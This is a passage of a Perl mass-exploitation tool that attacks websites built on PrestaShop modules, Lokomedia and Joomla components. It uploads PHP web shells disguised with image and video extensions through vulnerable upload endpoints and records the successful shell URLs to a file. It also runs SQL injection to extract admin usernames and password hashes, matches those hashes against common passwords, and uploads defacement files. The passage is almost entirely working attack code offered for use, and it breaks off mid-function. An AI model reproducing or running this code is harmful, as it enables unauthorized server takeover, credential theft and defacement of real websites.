my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$oneattributewizardproup="$site/modules/1attributewizardpro/file_uploads/XAttacker.php?X=Attacker";

my $checkoneattributewizardpro = $ua->get("$oneattributewizardproup")->content;
if($checkoneattributewizardpro =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $oneattributewizardproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$oneattributewizardproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"1attributewizardpro";
print color('bold white')," ............... ";
print color('bold red'),"NOt VULN\n";
}
}

################ attributewizardpro.OLD #####################
sub attributewizardproOLD(){
my $url = "$site/modules/attributewizardpro.OLD/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$attributewizardproOLDup="$site/modules/attributewizardpro.OLD/file_uploads/XAttacker.php?X=Attacker";

my $checkattributewizardproOLD = $ua->get("$attributewizardproOLDup")->content;
if($checkattributewizardproOLD =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardproOLDup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardproOLDup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Attributewizardpro.OLD";
print color('bold white')," ............ ";
print color('bold red'),"NOt VULN\n";
}
}


################ attributewizardpro_x #####################
sub attributewizardpro_x(){
my $url = "$site/modules/attributewizardpro_x/file_upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["XAttacker.php"],]);

$attributewizardpro_xup="$site/modules/attributewizardpro_x/file_uploads/XAttacker.php?X=Attacker";

my $checkattributewizardpro_x = $ua->get("$attributewizardpro_xup")->content;
if($checkattributewizardpro_x =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $attributewizardpro_xup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$attributewizardpro_xup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"attributewizardpro_x";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ advancedslider #####################
sub advancedslider(){
my $url = "$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XAttacker.php.png"],]);

$advancedsliderup="$site/modules/advancedslider/uploads/XAttacker.php.png?X=Attacker";

my $checkadvancedslider = $ua->get("$advancedsliderup")->content;
if($checkadvancedslider =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $advancedsliderup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$advancedsliderup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"advancedslider";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ cartabandonmentpro #####################
sub cartabandonmentpro(){
my $url = "$site/modules/cartabandonmentpro/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["XAttacker.php.png"],]);

$cartabandonmentproup="$site/modules/cartabandonmentpro/uploads/XAttacker.php.png?X=Attacker";

my $checkcartabandonmentpro = $ua->get("$cartabandonmentproup")->content;
if($checkcartabandonmentpro =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentpro";
print color('bold white')," ................ ";
print color('bold red'),"NOt VULN\n";
}
}

################ cartabandonmentproOld #####################
sub cartabandonmentproOld(){
my $url = "$site/modules/cartabandonmentproOld/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [image => ["XAttacker.php.png"],]);

$cartabandonmentproOldup="$site/modules/cartabandonmentproOld/uploads/XAttacker.php.png?X=Attacker";

my $checkcartabandonmentproOld = $ua->get("$cartabandonmentproOldup")->content;
if($checkcartabandonmentproOld =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $cartabandonmentproOldup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cartabandonmentproOldup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"cartabandonmentproOld";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}

################ videostab #####################
sub videostab(){
my $url = "$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [qqfile => ["XAttacker.php.mp4"],]);

$videostabup="$site/modules/videostab/uploads/XAttacker.php.mp4?X=Attacker";

my $checkvideostab = $ua->get("$videostabup")->content;
if($checkvideostab =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $videostabup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$videostabup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"videostab";
print color('bold white')," ......................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ wg24themeadministration #####################
sub wg24themeadministration(){
my $url = "$site/modules//wg24themeadministration/wg24_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'pattern_upload', Content => [bajatax => ["XAttacker.php"],]);

$wg24themeadministrationup="$site/modules//wg24themeadministration///img/upload/XAttacker.php?X=Attacker";

my $checkwg24themeadministration = $ua->get("$wg24themeadministrationup")->content;
if($checkwg24themeadministration =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wg24themeadministrationup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wg24themeadministrationup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wg24themeadministration";
print color('bold white')," ........... ";
print color('bold red'),"NOt VULN\n";
}
}

################ fieldvmegamenu #####################
sub fieldvmegamenu(){
my $url = "$site/modules/fieldvmegamenu/ajax/upload.php";
my $shell ="XAttacker.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$fieldvmegamenuup="$site/modules/fieldvmegamenu/uploads/XAttacker.php?X=Attacker";

my $checkfieldvmegamenu = $ua->get("$fieldvmegamenuup")->content;
if($checkfieldvmegamenu =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $fieldvmegamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$fieldvmegamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"fieldvmegamenu";
print color('bold white')," .................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ wdoptionpanel #####################
sub wdoptionpanel(){
my $url = "$site/modules/wdoptionpanel/wdoptionpanel_ajax.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', data => 'bajatax', type => 'image_upload', Content => [bajatax => ["XAttacker.php"],]);

$wdoptionpanelup="$site/modules/wdoptionpanel/upload/XAttacker.php?X=Attacker";

my $checkwdoptionpanel = $ua->get("$wdoptionpanelup")->content;
if($checkwdoptionpanel =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $wdoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$wdoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"wdoptionpanel";
print color('bold white')," ..................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ pk_flexmenu #####################
sub pk_flexmenu(){
my $url = "$site/modules/pk_flexmenu/ajax/upload.php";
my $shell ="XAttacker.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$pk_flexmenuup="$site/modules/pk_flexmenu/uploads/XAttacker.php?X=Attacker";

my $checkpk_flexmenu = $ua->get("$pk_flexmenuup")->content;
if($checkpk_flexmenu =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_flexmenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$pk_flexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_flexmenu";
print color('bold white')," ....................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ pk_vertflexmenu #####################
sub pk_vertflexmenu(){
my $url = "$site/modules/pk_vertflexmenu/ajax/upload.php";
my $shell ="XAttacker.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$pk_vertflexmenuup="$site/modules/pk_vertflexmenu/uploads/XAttacker.php?X=Attacker";

my $checkpk_vertflexmenu = $ua->get("$pk_vertflexmenuup")->content;
if($checkpk_vertflexmenu =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $pk_vertflexmenuup\n";

open (TEXT, '>>Result/Shells.txt');
print TEXT "$pk_vertflexmenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"pk_vertflexmenu";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ nvn_export_orders #####################
sub nvn_export_orders(){
my $url = "$site/modules/nvn_export_orders/upload.php";
my $shell ="nvn_extra_add.php";
my $field_name = "images[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$nvn_export_ordersup="$site/modules/nvn_export_orders/nvn_extra_add.php?X=Attacker";

my $checknvn_export_orders = $ua->get("$nvn_export_ordersup")->content;
if($checknvn_export_orders =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $nvn_export_ordersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$nvn_export_ordersup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"nvn_export_orders";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ megamenu #####################
sub megamenu(){
my $url = "$site/modules/megamenu/uploadify/uploadify.php?id=XAttacker.php";
my $shell ="XAttacker.php.png";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$megamenuup="$site/XAttacker.php.png?X=Attacker";

my $checkmegamenu = $ua->get("$megamenuup")->content;
if($checkmegamenu =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $megamenuup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$megamenuup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"megamenu";
print color('bold white')," .......................... ";
print color('bold red'),"NOt VULN\n";
}
}

################ tdpsthemeoptionpanel #####################
sub tdpsthemeoptionpanel(){
my $url = "$site/modules/tdpsthemeoptionpanel/tdpsthemeoptionpanelAjax.php";
my $shell ="XAttacker.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]

            );
$tdpsthemeoptionpanelup="$site/modules/tdpsthemeoptionpanel/upload/XAttacker.php?X=Attacker";

my $checktdpsthemeoptionpanel = $ua->get("$tdpsthemeoptionpanelup")->content;
if($checktdpsthemeoptionpanel =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $tdpsthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$tdpsthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"tdpsthemeoptionpanel";
print color('bold white')," .............. ";
print color('bold red'),"NOt VULN\n";
}
}


################ psmodthemeoptionpanel #####################
sub psmodthemeoptionpanel(){
my $url = "$site/modules/psmodthemeoptionpanel/psmodthemeoptionpanel_ajax.php";
my $shell ="XAttacker.php";
my $field_name = "image_upload";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            data => 'bajatax',
            Content => [ $field_name => ["$shell"] ]

            );
$psmodthemeoptionpanelup="$site/modules/psmodthemeoptionpanel/upload/XAttacker.php?X=Attacker";

my $checkpsmodthemeoptionpanel = $ua->get("$psmodthemeoptionpanelup")->content;
if($checkpsmodthemeoptionpanel =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $psmodthemeoptionpanelup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$psmodthemeoptionpanelup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"psmodthemeoptionpanel";
print color('bold white')," ............. ";
print color('bold red'),"NOt VULN\n";
}
}


################ masseditproduct #####################
sub masseditproduct(){
my $url = "$site/modules/lib/redactor/file_upload.php";
my $shell ="XAttacker.php";
my $field_name = "file";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]

            );
$masseditproductup="$site/masseditproduct/uploads/file/XAttacker.php?X=Attacker";

my $checkmasseditproduct = $ua->get("$masseditproductup")->content;
if($checkmasseditproduct =~/X Attacker/) {

print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $masseditproductup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$masseditproductup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"masseditproduct";
print color('bold white')," ................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ lokomedia #####################
sub lokomedia(){
$lokoversion = "$site/statis--7'union select /*!50000Concat*/(Version())+from+users--+--+kantordesa.html";
$lokodatabase = "$site/statis--7'union select /*!50000Concat*/(Database())+from+users--+--+kantordesa.html";
$lokouserdata = "$site/statis--7'union select /*!50000Concat*/(USER())+from+users--+--+kantordesa.html";
$lokouser = "$site/statis--7'union select /*!50000Concat*/(username)+from+users--+--+kantordesa.html";
$lokopass = "$site/statis--7'union select /*!50000Concat*/(password)+from+users--+--+kantordesa.html";

my $checklokoversion = $ua->get("$lokoversion")->content;
if($checklokoversion =~/<meta name="description" content="(.*)">/) {
$dbv=$1;

if($dbv =~ /[a-z]/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," MySQL Version : $dbv\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\n[ DATABASE ]\n";
print TEXT "$site";
print TEXT "\nMySQL Version : $dbv";
close (TEXT);
my $checklokodatabase = $ua->get("$lokodatabase")->content;
if($checklokodatabase =~/<meta name="description" content="(.*)">/) {
$db=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Database : $db\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nCurrent Database : $db";
close (TEXT);
}
my $checklokouserdata = $ua->get("$lokouserdata")->content;
if($checklokouserdata =~/<meta name="description" content="(.*)">/) {
$udb=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Current Username : $udb\n";
}
my $checklokouser = $ua->get("$lokouser")->content;
if($checklokouser =~/<meta name="description" content="(.*)">/) {
$user=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Username : $user\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nUsername : $user";
close (TEXT);
}
my $checklokopass = $ua->get("$lokopass")->content;
if($checklokopass =~/<meta name="description" content="(.*)">/) {
$hash=$1;
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white')," Hash Pass : $hash\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nHash Pass : $hash";
close (TEXT);
lokohash();
lokopanel();
}
}
}
}
sub lokohash(){
if ($hash =~ /a66abb5684c45962d887564f08346e8d/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123456\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123456";
close (TEXT);
}
elsif ($hash =~ /0192023a7bbd73250516f069df18b500/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin123\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin123";
close (TEXT);
}
elsif ($hash =~ /73acd9a5972130b75066c82595a1fae3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ADMIN\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : ADMIN";
close (TEXT);
}
elsif ($hash =~ /7b7bc2512ee1fedcd76bdc68926d4f7b/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : Administrator\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : Administrator";
close (TEXT);
}
elsif ($hash =~ /c21f969b5f03d33d43e04f8f136e7682/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : default\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : default";
close (TEXT);
}
elsif ($hash =~ /1a1dc91c907325c69271ddf0c944bc72/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : pass\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : pass";
close (TEXT);
}
elsif ($hash =~ /5f4dcc3b5aa765d61d8327deb882cf99/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : password\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : password";
close (TEXT);
}
elsif ($hash =~ /098f6bcd4621d373cade4e832627b4f6/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : test\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : test";
close (TEXT);
}
elsif ($hash =~ /21232f297a57a5a743894a0e4a801fc3/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : admin\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : admin";
close (TEXT);
}
elsif ($hash =~ /fe01ce2a7fbac8fafaed7c982a04e229/){
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Cracking Hash : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : demo\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nPassword : demo";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Password : ";
print color('bold red'),"NOt FOUND\n";
}
}

sub lokopanel(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);
$pathone = "$site/redaktur";
my $lokomediacms = $ua->get("$pathone")->content;
if($lokomediapathone =~/administrator|username|password/) {
  print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Admin Panel : ";
print color('bold green'),"Found!\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"URL : $pathone\n";
open (TEXT, '>>Result/databases.txt');
print TEXT "\nURL : $pathone";
close (TEXT);
}
else{
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"]  ";
print color('bold white'),"Admin Panel : ";
print color('bold red'),"NOt FOUND\n";
}
}

################################################################
#                                                              #
#                            JOOMLA                            #
#                                                              #
################################################################

sub comjce(){
$ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout(15);


my $jceurl="$site/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20";

my $res = $ua->post($jceurl,
    Content_Type => 'form-data',
    Content => [
        'upload-dir' => './../../',
        'upload-overwrite' => 0,
        'Filedata' => ["XAttacker.gif"],
        'action' => 'upload'
        ]
    )->decoded_content;

$remote = IO::Socket::INET->new(
        Proto=>'tcp',
        PeerAddr=>"$site",
        PeerPort=>80,
        Timeout=>15
        );
$jceup= "$site/XAttacker.gif";
$check = $ua->get($jceup)->status_line;
if ($check =~ /200/){
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold white')," ........................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Picture Uploaded Successfully\n";
print color('bold white'),"  [Link] => $jceup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$jceup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jce";
print color('bold white')," ........................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ Com Media #####################
sub comedia(){
my $url = "$site/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
my $index ="XAttacker.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]

            );

$mediaup="$site/images/XAttacker.txt";

$checkpofwup = $ua->get("$mediaup")->content;
if($checkpofwup =~/HaCKeD/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold white')," ......................... ";
print color('bold green'),"VULN\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Link] => $mediaup\n";
open (TEXT, '>>Result/index.txt');
print TEXT "$mediaup\n";
close (TEXT);
}else{
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Media";
print color('bold white')," ......................... ";
print color('bold red'),"NOt VULN\n";
}
}


################ comjdownloads #####################
sub comjdownloads(){
$file="Jattack.rar";
$filez="XAttacker.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/XAttacker.php.j?X=Attacker';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Mohamed Riahi", mail=>"moham3driahi@gmail.com", filetitle =>"Mohamed Riahi xD", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/X Attacker/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," .................... ";
